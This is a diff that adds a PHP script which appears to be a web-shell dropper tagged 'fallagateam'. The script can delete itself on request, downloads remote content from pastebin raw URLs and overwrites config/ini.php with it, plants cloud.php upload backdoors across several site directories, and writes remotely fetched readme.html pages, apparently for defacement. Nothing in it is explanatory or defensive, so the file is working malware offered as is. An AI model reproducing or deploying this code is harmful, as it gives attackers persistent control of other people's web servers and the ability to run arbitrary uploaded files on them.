@@ -1,0 +1,66 @@
+<?php
+if(isset($_GET["Gassrini"]))
+	{
+	$kurd =unlink(__FILE__);
+	if ($kurd){ echo "Ok"; }else{ echo "error"; }}
+?>
+<?php
+function http_http($url){
+	$im = curl_init($url);
+	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($im, CURLOPT_HEADER, 0);
+	return curl_exec($im);
+	curl_close($im);
+}
+
+
+$checkx = $_SERVER['DOCUMENT_ROOT'] . "/config/ini.php" ;
+$textx = http_http('http://pastebin.com/raw/3S0Eqf8L');
+$openx = fopen($checkx, 'w');fwrite($openx, $textx);fclose($openx);
+$r=fopen("css.php", "w"); fwrite($r,$textx); fclose($r);
+?>
+<?php
+error_reporting(0);
+echo "shopbotbyfallagassrini";
+function Random($length = 6) {
+    $pit = 'abcdefghijklmnopqrstuvwxyz';
+    $rands = '';
+    for ($i = 0; $i < $length; $i++) {
+        $rands .= $pit[rand(0, strlen($pit) - 1)];
+    }
+    return $rands;
+}
+$ran = Random();
+echo '<a hresdddf="'."$ran".'">';
+$file1 = '<?php
+error_reporting(0);
+if(isset($_GET['."$ran".']))
+	{
+
+echo "path:".getcwd()."";
+echo "<b><br>uname:".php_uname()."<br></b>fallagateam";
+		print "\n";$disable_functions = @ini_get("disable_functions"); 
+		echo "DisablePHP=".$disable_functions; print "<br>"; 
+		echo"<form method=post enctype=multipart/form-data>"; 
+		echo"<input type=file name=f><input name=v type=submit id=v value=up><br>"; 
+		  if($_POST["v"]==up)
+{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}  
+{ if(@copy($_FILES["emad"]["tmp_name"],$_FILES["emad"]["name"])){echo"<b></b>-->".$_FILES["emad"]["name"];}else{echo"<b>";}}}
+?>';
+$r=fopen("cloud.php", "w"); fwrite($r,$file1); fclose($r);
+$r=fopen("../../../cloud.php", "w"); fwrite($r,$file1); fclose($r);
+$r=fopen("../../../img/cloud.php", "w"); fwrite($r,$file1); fclose($r);
+$r=fopen("../../../config/cloud.php", "w"); fwrite($r,$file1); fclose($r);
+$r=fopen("../../../css/cloud.php", "w"); fwrite($r,$file1); fclose($r);
+
+$file111 = http_http('http://pastebin.com/raw/gMsQkBCK');
+$r=fopen("readme.html", "w"); fwrite($r,$file111); fclose($r);
+$r=fopen("../../../img/readme.html", "w"); fwrite($r,$file111); fclose($r);
+$r=fopen("../../../readme.html", "w"); fwrite($r,$file111); fclose($r);
+$r=fopen("../../../config/readme.html", "w"); fwrite($r,$file111); fclose($r);
+$r=fopen("../../../css/readme.html", "w"); fwrite($r,$file111); fclose($r);
+
+
+?>
